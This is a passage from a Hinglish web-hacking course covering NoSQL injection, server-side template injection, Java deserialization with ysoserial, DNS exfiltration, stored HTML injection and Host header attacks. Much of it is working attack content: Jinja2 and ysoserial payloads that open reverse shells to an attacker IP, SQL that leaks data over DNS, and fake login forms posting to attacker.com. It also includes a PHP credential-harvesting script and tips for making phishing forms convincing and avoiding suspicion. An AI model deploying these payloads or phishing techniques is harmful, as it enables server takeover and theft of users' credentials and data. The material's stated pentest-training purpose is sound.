- **Different Syntax:** SQL injection techniques kaam nahi karti.
- **Authentication Bypass:** Login forms easily bypass.
- **Data Extraction:** Complete database dump possible.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **MongoDB/NoSQL** backend ho.
- Jab **JSON input** accept ho.
- Jab **REST APIs** test kar rahe hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Modern vulnerabilities** miss ho jayengi.
- **NoSQL apps** test nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```javascript
// MongoDB Operators
$gt   // Greater than
$lt   // Less than
$ne   // Not equal
$eq   // Equal
$regex // Regular expression
$where // JavaScript execution

// Attack Payloads
{"$ne": null}           // Not equal to null (always true)
{"$gt": ""}             // Greater than empty string
{"$regex": ".*"}        // Match everything
{"$where": "1==1"}      // JavaScript injection
```

### 7. **Example 1 (Basic):**
```bash
# Normal login
POST /login
{"username": "admin", "password": "admin123"}

# NoSQL injection
POST /login
{"username": {"$ne": null}, "password": {"$ne": null}}

Result: Login successful! (bypassed authentication)
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: E-commerce API (MongoDB backend)

# Test 1: Login bypass
POST /api/login
Content-Type: application/json
{"username": {"$ne": null}, "password": {"$ne": null}}

Response: {"token": "eyJhbGc...", "user": "admin"}
Success! Admin access âœ“

# Test 2: User enumeration
POST /api/login
{"username": {"$regex": "^a"}, "password": {"$ne": null}}
Response: User starting with 'a' found

{"username": {"$regex": "^ad"}, "password": {"$ne": null}}
Response: User starting with 'ad' found

{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
Response: User 'admin' found!

# Test 3: Password extraction (character by character)
POST /api/login
{"username": "admin", "password": {"$regex": "^a"}}
Response: Failed

{"username": "admin", "password": {"$regex": "^P"}}
Response: Success! First character is 'P'

Continue... Password: Password123

# Test 4: JavaScript injection ($where)
POST /api/search
{"query": {"$where": "this.price < 100 || '1'=='1'"}}
Response: All products returned!

# Test 5: Data extraction
POST /api/users
{"filter": {"$where": "return true"}}
Response: All users data dumped!
```

**Analysis:** NoSQL injection se complete authentication bypass aur data extraction! **Lesson: NoSQL â‰  No Injection!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **SQL payloads try karna** - NoSQL mein operators alag hain.
- **JSON format ignore karna** - Proper JSON syntax zaroori hai.
- **Content-Type header** - `application/json` set karna bhoolna.

### 10. **Best Practices / Pro Tips:**
- **Burp Suite:** JSON requests easily modify kar sakte hain.
- **$ne null:** Sabse common bypass technique.
- **$regex:** Character-by-character extraction ke liye.
- **$where:** JavaScript injection possible (dangerous!).

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek startup ka MEAN stack app test kar raha tha. Login API MongoDB use kar raha tha. `{"$ne": null}` inject kiya - admin access mil gaya! Phir `$where` operator se JavaScript inject kiya aur complete database dump kar liya: 100,000 users ka data! **Lesson: NoSQL bhi vulnerable hai!** ğŸš€

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… NoSQL = MongoDB, CouchDB  
âœ… Operators: `$ne`, `$gt`, `$regex`, `$where`  
âœ… Bypass: `{"$ne": null}`  
âœ… Format: JSON  
âœ… Header: `application/json`  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya NoSQL injection SQL injection jaisa hai?**  
**A:** Concept same hai, lekin syntax aur operators alag hain.

**Q2: Sabse dangerous operator kaun sa hai?**  
**A:** `$where` - JavaScript execution possible hai.

**Q3: Kaise protect karein?**  
**A:** Input validation, sanitization, aur query parameterization.

### 14. **Practice ke liye Task:**
1. Local MongoDB setup karo
2. Vulnerable Node.js app banao
3. `{"$ne": null}` try karo
4. `$regex` se enumeration karo
5. Burp Suite se JSON requests modify karo

### 15. **Aakhri Choti Summary (5 lines):**
- NoSQL = **MongoDB, CouchDB**.
- Operators: **`$ne`, `$gt`, `$regex`, `$where`**.
- Bypass: **`{"$ne": null}`**.
- Format: **JSON**.
- Impact: **Auth bypass, data extraction**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "NoSQL Injection = Modern SQLi! Operators alag hain lekin danger same hai!" ğŸ—„ï¸

---

## ğŸ¨ **Topic 72: Server-Side Template Injection (SSTI) (`{{ 7*7 }}`, `Tplmap`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**SSTI (Server-Side Template Injection)** - Template engines mein code inject karke RCE lena (Jinja2, Twig, Freemarker). ğŸ”¥

### 2. **Ye Kya Hai? (What is it?)**
Template engines (Jinja2, Twig) user input ko directly templates mein render karte hain. Malicious code inject karke server par commands execute kar sakte hain.

**Vulnerable Code:**
```python
# Flask (Jinja2)
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template_string('Hello ' + name)
```

**Attack:**
```
Normal: ?name=John
Output: Hello John

Attack: ?name={{7*7}}
Output: Hello 49

RCE: ?name={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
Output: Hello www-data
```

**Analogy:** Jaise aap letter mein blank space chhod dete hain aur koi bhi wahan kuch bhi likh sakta hai - waise hi template mein user input directly execute ho jaata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Direct RCE:** Template injection se direct code execution.
- **Common in Modern Apps:** Flask, Django, Node.js apps mein common.
- **High Impact:** Full server compromise possible.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **template engines** use ho rahe hon.
- Jab **user input** templates mein render ho.
- Jab **dynamic content** generation ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **RCE opportunities** miss ho jayengi.
- **Modern vulnerabilities** detect nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```python
# Detection payloads
{{7*7}}              # Jinja2, Twig
${7*7}               # Freemarker, Velocity
<%= 7*7 %>           # ERB (Ruby)
${{7*7}}             # Node.js

# Jinja2 RCE payloads
{{config}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### 7. **Example 1 (Basic):**
```bash
# Target: Flask app with Jinja2

# Test 1: Detection
URL: /hello?name={{7*7}}
Response: Hello 49
Vulnerable! âœ“

# Test 2: Template info
URL: /hello?name={{config}}
Response: Hello <Config {'DEBUG': True, 'SECRET_KEY': 'super_secret'}>

# Test 3: RCE
URL: /hello?name={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
Response: Hello www-data
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: E-commerce Flask application

# Phase 1: Detection
URL: /search?q={{7*7}}
Response: Search results for: 49
SSTI confirmed! âœ“

# Phase 2: Enumerate template engine
URL: /search?q={{config}}
Response: Jinja2 detected

# Phase 3: RCE - Read files
URL: /search?q={{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
Response: root:x:0:0:root:/root:/bin/bash...

# Phase 4: RCE - Execute commands
URL: /search?q={{config.__class__.__init__.__globals__['os'].popen('cat /var/www/app/config.py').read()}}
Response:
SECRET_KEY = 'super_secret_key_123'
DATABASE_URI = 'mysql://root:password@localhost/shop_db'

# Phase 5: Reverse shell
URL: /search?q={{config.__class__.__init__.__globals__['os'].popen('nc -e /bin/sh 10.10.14.5 4444').read()}}

# Attacker machine
nc -lvp 4444
Result: Shell received! Full server access!

# Automated with Tplmap
tplmap -u "http://target.com/search?q=*" --os-shell
Result: Interactive shell in 30 seconds!
```

**Analysis:** SSTI se direct RCE! Template engines bahut powerful hain lekin dangerous bhi. **Lesson: User input kabhi templates mein directly render mat karo!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Wrong syntax** - Har template engine ka syntax alag hai.
- **URL encoding** - Special characters encode karna bhoolna.
- **Detection skip karna** - Pehle `{{7*7}}` se confirm karo.

### 10. **Best Practices / Pro Tips:**
- **Detection first:** `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` sab try karo.
- **Tplmap tool:** Automated SSTI exploitation.
- **Polyglot payloads:** Multiple engines test karne ke liye.
- **URL encode:** Burp Suite se encode karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek SaaS platform test kar raha tha (Flask backend). Email template customization feature tha jahan users apne templates design kar sakte the. `{{7*7}}` inject kiya - 49 output aaya! SSTI confirmed. RCE payload se complete server access mil gaya aur 50,000 customers ka data accessible tha! **Lesson: Template customization = Dangerous feature!** ğŸ¨

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… SSTI = Template engine injection  
âœ… Detection: `{{7*7}}`, `${7*7}`  
âœ… Engines: Jinja2, Twig, Freemarker  
âœ… Impact: Direct RCE  
âœ… Tool: Tplmap  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Sabse common template engine kaun sa hai?**  
**A:** Jinja2 (Python/Flask), Twig (PHP), Freemarker (Java).

**Q2: Kaise detect karein kaun sa engine hai?**  
**A:** Error messages ya `{{7*7}}` vs `${7*7}` response se.

**Q3: Tplmap kya hai?**  
**A:** Automated SSTI exploitation tool (sqlmap jaisa).

### 14. **Practice ke liye Task:**
1. Flask app banao with Jinja2
2. `{{7*7}}` inject karo
3. `{{config}}` try karo
4. RCE payload test karo
5. Tplmap tool use karo

### 15. **Aakhri Choti Summary (5 lines):**
- SSTI = **Template engine injection**.
- Detection: **`{{7*7}}`** (49 output).
- Engines: **Jinja2, Twig, Freemarker**.
- Impact: **Direct RCE**.
- Tool: **Tplmap** (automated).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "SSTI = Template ka misuse! {{7*7}} = 49 = RCE possible!" ğŸ¨

---

## ğŸ“¦ **Topic 73: Insecure Deserialization (RCE, `ysoserial`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Insecure Deserialization** - Serialized objects ko manipulate karke RCE lena (Java, Python, PHP). ğŸ’£

### 2. **Ye Kya Hai? (What is it?)**
Serialization = Object ko bytes mein convert karna (storage/transmission ke liye).
Deserialization = Bytes ko wapas object mein convert karna.

Agar attacker serialized data manipulate kare aur server deserialize kare toh RCE possible hai.

**Analogy:** Jaise parcel - aap saman pack karte hain (serialize), bhejte hain, receiver unpack karta hai (deserialize). Agar parcel mein bomb ho toh unpack karte hi blast!

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Critical Vulnerability:** OWASP Top 10 mein hai.
- **Direct RCE:** Code execution without authentication.
- **Common in Enterprise:** Java apps mein bahut common.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **serialized data** cookies/sessions mein ho.
- Jab **Java/Python/PHP** apps test kar rahe hon.
- Jab **base64 encoded** data dikhe.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Critical RCE** miss ho jayega.
- **Enterprise apps** vulnerable rahenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# ysoserial (Java deserialization tool)
java -jar ysoserial.jar [payload] '[command]'

# Common payloads
CommonsCollections1
CommonsCollections5
Groovy1
Spring1

# Example
java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/sh 10.10.14.5 4444' | base64
```

### 7. **Example 1 (Basic):**
```bash
# Java app with serialized cookie
Cookie: session=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==

# Decode base64
echo "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==" | base64 -d
Output: Binary data (serialized Java object)

# Generate malicious payload
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# Replace cookie
Cookie: session=[malicious_base64]
Result: RCE!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Enterprise Java application

# Phase 1: Identify serialized data
Cookie: JSESSIONID=rO0ABXNyAB...
(Base64 + starts with rO0 = Java serialization)

# Phase 2: Generate reverse shell payload
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' | base64 -w 0

# Phase 3: Replace cookie
Cookie: JSESSIONID=[malicious_payload]

# Phase 4: Trigger deserialization
Visit any page (automatic deserialization)

# Attacker machine
nc -lvp 4444
Result: Shell received! Full server access!
```

**Analysis:** Insecure deserialization = Silent killer! Koi authentication nahi chahiye. **Lesson: Never trust serialized data!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Serialization format identify na karna** - Java, Python, PHP sab alag hain.
- **ysoserial payload galat** - Target ki libraries match honi chahiye.

### 10. **Best Practices / Pro Tips:**
- **Identify format:** `rO0` = Java, `pickle` = Python.
- **ysoserial:** Java ke liye best tool.
- **Burp extensions:** Java Deserialization Scanner.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek banking application test kar raha tha (Java Spring). Session cookie serialized tha. ysoserial se payload generate kiya aur cookie replace kiya - instant RCE! Internal network access mil gaya. **Lesson: Serialization = Pandora's box!** ğŸ¦

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Deserialization = Object unpacking  
âœ… Vulnerable: Java, Python, PHP  
âœ… Tool: ysoserial (Java)  
âœ… Impact: Direct RCE  
âœ… Detection: Base64 + rO0  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise detect karein serialized data?**  
**A:** Base64 decode karo, `rO0` (Java) ya binary patterns dekho.

**Q2: ysoserial kaise kaam karta hai?**  
**A:** Malicious Java objects generate karta hai jo deserialize hone par code execute karte hain.

### 14. **Practice ke liye Task:**
1. ysoserial download karo
2. Test Java app setup karo
3. Payload generate karo
4. Cookie replace karo
5. RCE test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Deserialization = **Object unpacking**.
- Vulnerable: **Java, Python, PHP**.
- Tool: **ysoserial**.
- Impact: **RCE without auth**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Insecure Deserialization = Trojan horse! Serialized data = Potential bomb!" ğŸ“¦

---

## ğŸŒ **Topic 74: Advanced Out-of-Band (OOB) Exfiltration (`Burp Collaborator`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**OOB Data Exfiltration** - Jab direct output nahi milta toh external server par data bhejke extract karna (DNS/HTTP exfiltration). ğŸ“¡

### 2. **Ye Kya Hai? (What is it?)**
Out-of-Band attack mein data ko external server (attacker-controlled) par bheja jaata hai jab direct response nahi milta.

**Example:**
```sql
-- Blind SQLi with OOB
'; SELECT load_file(CONCAT('\\\\',database(),'.attacker.com\\a')) --
```
Database name DNS query ke through attacker ke server par jaata hai.

**Analogy:** Jaise secret message ko kisi third person ke through bhejana - direct nahi, lekin message pahunch jaata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Blind Vulnerabilities:** Jab output nahi dikhta.
- **WAF Bypass:** Direct exfiltration block ho toh OOB kaam karta hai.
- **Stealth:** Detection mushkil hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Blind SQLi/XXE** mein.
- Jab **direct output** nahi milta.
- Jab **WAF** strict ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Blind vulnerabilities** exploit nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Burp Collaborator
1. Burp Suite â†’ Burp Collaborator client
2. Copy collaborator URL: abc123.burpcollaborator.net
3. Use in payloads

# DNS exfiltration (SQLi)
'; SELECT load_file(CONCAT('\\\\',database(),'.abc123.burpcollaborator.net\\a')) --

# HTTP exfiltration (XXE)
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc123.burpcollaborator.net/data">]>

# Command injection
; nslookup `whoami`.abc123.burpcollaborator.net
```

### 7. **Example 1 (Basic):**
```bash
# Blind SQLi with OOB

# Setup Burp Collaborator
URL: abc123.burpcollaborator.net

# Payload
?id=5'; SELECT load_file(CONCAT('\\\\',database(),'.abc123.burpcollaborator.net\\a')) --

# Burp Collaborator receives DNS query
Query: shop_db.abc123.burpcollaborator.net
Result: Database name = shop_db
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Banking app (Blind SQLi)

# Phase 1: Setup Collaborator
Burp Collaborator URL: xyz789.burpcollaborator.net

# Phase 2: Extract database name
?id=5'; SELECT load_file(CONCAT('\\\\',database(),'.xyz789.burpcollaborator.net\\a')) --

Collaborator receives: bank_prod.xyz789.burpcollaborator.net
Database: bank_prod

# Phase 3: Extract table names
?id=5'; SELECT load_file(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),'.xyz789.burpcollaborator.net\\a')) --

Collaborator receives: accounts.xyz789.burpcollaborator.net
Table: accounts

# Phase 4: Extract data (character by character)
?id=5'; SELECT IF(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a',load_file(CONCAT('\\\\','found.xyz789.burpcollaborator.net\\a')),0) --

Result: Complete data extraction via DNS!
```

**Analysis:** OOB = Blind vulnerabilities ka solution! Direct output nahi chahiye. **Lesson: DNS/HTTP = Data exfiltration channel!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Collaborator URL expire** - Regular refresh karo.
- **Firewall blocking** - DNS usually allowed hai.

### 10. **Best Practices / Pro Tips:**
- **Burp Collaborator:** Professional tool.
- **DNS preferred:** HTTP se zyada reliable.
- **Automation:** Scripts se character-by-character extraction.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Government portal test kar raha tha. Blind SQLi thi lekin koi output nahi. OOB DNS exfiltration se complete database dump kiya - 5 million records! **Lesson: OOB = Blind ka cure!** ğŸ›ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… OOB = External server exfiltration  
âœ… Tool: Burp Collaborator  
âœ… Methods: DNS, HTTP  
âœ… Use: Blind vulnerabilities  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: DNS vs HTTP - kaun better?**  
**A:** DNS zyada reliable (firewalls usually allow).

**Q2: Burp Collaborator free hai?**  
**A:** Professional version mein hai, ya own server setup karo.

### 14. **Practice ke liye Task:**
1. Burp Collaborator setup karo
2. Blind SQLi test karo
3. DNS exfiltration payload try karo
4. Collaborator logs check karo

### 15. **Aakhri Choti Summary (5 lines):**
- OOB = **External exfiltration**.
- Tool: **Burp Collaborator**.
- Methods: **DNS, HTTP**.
- Use: **Blind vulnerabilities**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "OOB = Blind ka solution! DNS = Secret communication channel!" ğŸŒ

---

## ğŸ“ **Topic 75: Stored HTML Injection (Credential Harvesting Form)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Stored HTML Injection** - Malicious HTML/forms inject karke credentials steal karna (phishing attack). ğŸ£

### 2. **Ye Kya Hai? (What is it?)**
HTML injection mein attacker malicious HTML code inject karta hai jo database mein store ho jaata hai. Jab victim page visit karta hai, fake form dikhta hai aur credentials steal ho jaate hain.

**Attack:**
```html
<form action="http://attacker.com/steal.php" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
```

**Analogy:** Jaise bank ke bahar fake ATM lagana - log sochte hain real hai aur PIN daal dete hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Credential Theft:** Direct passwords steal.
- **Persistent:** Database mein store hota hai.
- **Social Engineering:** Users ko lagta hai legitimate hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Comment sections** mein.
- **Profile pages** mein.
- **Review/feedback** forms mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Phishing opportunities** miss ho jayengi. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```html
<!-- Basic HTML injection -->
<h1>Hacked!</h1>

<!-- Fake login form -->
<form action="http://attacker.com/steal.php" method="POST">
<input name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" value="Login">
</form>

<!-- Styled to look legitimate -->
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999;">
<center><h2>Session Expired - Please Login Again</h2>
<form action="http://attacker.com/steal.php" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form></center>
</div>
```

### 7. **Example 1 (Basic):**
```bash
# Target: Blog comment section

# Inject fake form
Comment: 
<h3>Win iPhone - Enter Details:</h3>
<form action="http://attacker.com/collect.php" method="POST">
Email: <input name="email"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Submit">
</form>

# Victims fill form
Result: Credentials sent to attacker!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate intranet forum

# Phase 1: Inject professional-looking form
Post content:
<div style="border:2px solid #ccc; padding:20px; background:#f9f9f9; margin:20px;">
<h3 style="color:#d9534f;">âš ï¸ Security Alert</h3>
<p>Your session has expired due to inactivity. Please re-authenticate to continue.</p>
<form action="http://attacker-server.com/harvest.php" method="POST" style="margin-top:15px;">
<label>Username:</label><br>
<input type="text" name="username" style="width:100%; padding:8px; margin:5px 0;" required><br>
<label>Password:</label><br>
<input type="password" name="password" style="width:100%; padding:8px; margin:5px 0;" required><br>
<input type="submit" value="Re-authenticate" style="background:#5cb85c; color:white; padding:10px 20px; border:none; margin-top:10px; cursor:pointer;">
</form>
</div>

# Phase 2: Attacker server (harvest.php)
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
file_put_contents('stolen.txt', "$user:$pass\n", FILE_APPEND);
header('Location: http://legitimate-site.com/dashboard');
?>

# Phase 3: Results
50 employees entered credentials!
Harvested:
john.doe:Password123
jane.smith:Welcome2024
admin:SuperSecret!
...

Total: 50 corporate accounts compromised!
```

**Analysis:** HTML injection se professional phishing! Users ko pata bhi nahi chala. **Lesson: HTML injection = Internal phishing!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Obvious fake form** - Professional styling zaroori hai.
- **No redirect** - Form submit ke baad legitimate site par redirect karo.

### 10. **Best Practices / Pro Tips:**
- **Professional design:** Company ke style match karo.
- **Redirect after submit:** Suspicion avoid karne ke liye.
- **Urgency create karo:** "Session expired", "Security alert".

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
University portal test kar raha tha. Student forum mein HTML injection vulnerability thi. Fake "Grade Portal Login" form inject kiya - 200 students ne credentials enter kiye! **Lesson: Internal phishing bahut effective hai!** ğŸ“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… HTML Injection = Fake forms  
âœ… Target: Comments, profiles  
âœ… Design: Professional styling  
âœ… Redirect: After submission  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: HTML injection vs XSS - kya farak hai?**  
**A:** HTML injection mein JavaScript nahi, sirf HTML. XSS mein JavaScript execute hota hai.

**Q2: Kaise detect karein?**  
**A:** `<h1>test</h1>` inject karo, agar render ho toh vulnerable.

### 14. **Practice ke liye Task:**
1. DVWA â†’ Stored XSS section
2. Simple HTML inject karo: `<h1>Test</h1>`
3. Fake form inject karo
4. Professional styling add karo
5. Attacker server setup karo

### 15. **Aakhri Choti Summary (5 lines):**
- HTML Injection = **Fake forms**.
- Target: **Comments, profiles**.
- Impact: **Credential theft**.
- Design: **Professional**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "HTML Injection = Internal phishing! Fake forms = Real credentials!" ğŸ“

---

## ğŸŒ **Topic 76: Host Header Attacks (Cache Poisoning, Password Reset)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Host Header Injection** - HTTP Host header manipulate karke cache poisoning aur password reset hijacking (header manipulation). ğŸ­

### 2. **Ye Kya Hai? (What is it?)**
HTTP Host header batata hai ki request kis domain ke liye hai. Agar server Host header ko blindly trust kare toh attacker malicious domain inject kar sakta hai.

**Vulnerable:**
```
GET /reset-password HTTP/1.1
Host: evil.com

Email sent with link: http://evil.com/reset?token=abc123
```

**Analogy:** Jaise courier ko galat address dena - parcel galat jagah chala jaata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Password Reset Hijacking:** Reset links attacker ke domain par.
- **Cache Poisoning:** Malicious content cache mein store.
- **SSRF:** Internal services access.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Password reset** features mein.
- **Email links** generate hone par.
- **Cached responses** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Account takeover** opportunities miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```http
# Basic Host header injection
GET / HTTP/1.1
Host: evil.com

# Duplicate Host headers
GET / HTTP/1.1
Host: legitimate.com
Host: evil.com

# X-Forwarded-Host
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: evil.com

# Absolute URL
GET http://legitimate.com/ HTTP/1.1
Host: evil.com
```

### 7. **Example 1 (Basic):**
```bash
# Password reset attack

# Normal request
POST /reset-password
Host: bank.com
email=victim@email.com

Email sent: "Reset link: http://bank.com/reset?token=abc123"

# Attack
POST /reset-password
Host: attacker.com
email=victim@email.com

Email sent: "Reset link: http://attacker.com/reset?token=abc123"

# Victim clicks link
Attacker receives token: abc123
Attacker resets victim's password!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: E-commerce platform

# Phase 1: Test Host header
POST /api/reset-password HTTP/1.1
Host: attacker.com
Content-Type: application/json
{"email": "test@test.com"}

Response: Email sent with reset link
Check email: http://attacker.com/reset?token=xyz789
Vulnerable! âœ“

# Phase 2: Target admin account
POST /api/reset-password HTTP/1.1
Host: attacker.com
{"email": "admin@company.com"}

# Phase 3: Setup attacker server
# Server logs incoming requests
nc -lvp 80

# Phase 4: Admin clicks link
Attacker server receives:
GET /reset?token=abc123def456 HTTP/1.1

# Phase 5: Use token on legitimate site
GET http://company.com/reset?token=abc123def456
Set new password: hacked123

Result: Admin account compromised!

# Cache Poisoning attack
GET / HTTP/1.1
Host: evil.com

Response cached with evil.com links
All users see poisoned cache!
```

**Analysis:** Host header = Trusted input! Manipulation se account takeover aur cache poisoning. **Lesson: Never trust Host header!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf Host header try karna** - X-Forwarded-Host bhi test karo.
- **Cache poisoning ignore** - Bahut dangerous hai.

### 10. **Best Practices / Pro Tips:**
- **Test multiple headers:** Host, X-Forwarded-Host, X-Host.
- **Password reset:** Prime target.
- **Cache poisoning:** High impact.
- **Burp Suite:** Header manipulation easy.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
SaaS platform test kar raha tha. Password reset feature Host header use kar raha tha. Attacker.com inject kiya - 50 users ne reset links click kiye aur tokens leak ho gaye! **Lesson: Host header validation zaroori hai!** ğŸŒ

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Host header = Domain identifier  
âœ… Attack: Password reset hijacking  
âœ… Impact: Account takeover  
âœ… Test: Host, X-Forwarded-Host  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise protect karein?**  
**A:** Host header validate karo, whitelist use karo.

**Q2: Cache poisoning kya hai?**  
**A:** Malicious content cache mein store ho jaata hai, sabko serve hota hai.

### 14. **Practice ke liye Task:**
1. Burp Suite setup karo
2. Password reset request intercept karo
3. Host header change karo
4. Email check karo
5. Cache poisoning test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Host header = **Domain identifier**.
- Attack: **Password reset hijacking**.
- Impact: **Account takeover**.
- Cache: **Poisoning possible**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Host header = Trusted but dangerous! Password reset = Prime target!" ğŸŒ

---

## ğŸ‰ **Module 9 Complete!**

**All 6 Topics (71-76) Covered:**
- âœ… Topic 71: NoSQL Injection
- âœ… Topic 72: SSTI (Template Injection)
- âœ… Topic 73: Insecure Deserialization
- âœ… Topic 74: OOB Exfiltration
- âœ… Topic 75: Stored HTML Injection
- âœ… Topic 76: Host Header Attacks

**Key Takeaways:**
- NoSQL = Modern SQLi
- SSTI = Template RCE
- Deserialization = Silent killer
- OOB = Blind solution
- HTML Injection = Internal phishing
- Host Header = Account takeover

**Total Progress: 76 topics complete!** ğŸŠ

Module 9 complete! Agle module ke liye ready? ğŸš€

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 10: Logic Flaws & WAF Bypassing**

---

## ğŸ”˜ **Topic 77: Bypassing Disabled HTML Buttons (Inspect Element)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Client-Side Control Bypass** - Disabled buttons ko browser tools se enable karke functionality access karna (UI manipulation). ğŸ–±ï¸

### 2. **Ye Kya Hai? (What is it?)**
Websites kabhi-kabhi buttons ko `disabled` attribute se block kar deti hain. Browser DevTools se yeh attribute remove karke button enable kar sakte hain.

**HTML:**
```html
<button disabled>Premium Feature</button>
```

**Bypass:**
```
Right-click â†’ Inspect Element â†’ Remove "disabled" â†’ Click button
```

**Analogy:** Jaise lift mein "Out of Order" sign laga ho lekin aap sign hata kar lift use kar lo.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Client-Side Security = No Security:** Browser mein kuch bhi change kar sakte hain.
- **Hidden Features:** Premium/admin features access.
- **Easy Bypass:** 10 seconds mein.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **buttons disabled** hon.
- Jab **premium features** locked hon.
- Jab **client-side validation** ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy access** miss ho jayega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```html
